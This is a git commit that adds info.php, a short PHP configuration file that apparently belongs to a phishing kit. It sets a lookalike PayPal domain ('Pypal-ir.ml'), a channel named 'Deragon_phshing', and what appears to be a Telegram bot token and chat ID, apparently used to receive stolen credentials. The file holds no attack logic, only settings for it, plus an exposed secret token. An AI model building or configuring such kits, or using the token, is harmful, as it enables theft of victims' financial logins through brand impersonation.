3ef2ba16e894e44729ba8796e08793e3ab1e510d
TRSONGIR <67713900+TRSONGIR@users.noreply.github.com>
2020-09-14 01:36:18 +0430

    ali

---
+++ info.php
@@ -0,0 +1,15 @@
+<?php
+
+ 
+$link= "https://Pypal-ir.ml";
+
+$chanel= "Deragon_phshing";
+
+$name = "Deragon" ;
+
+
+$TOKENM = "1187687456:AAEXi1_NMeQdRQ_jme1N26m6kaEULF06ap8";
+
+$IDM = -1001193131026;
+
+?>
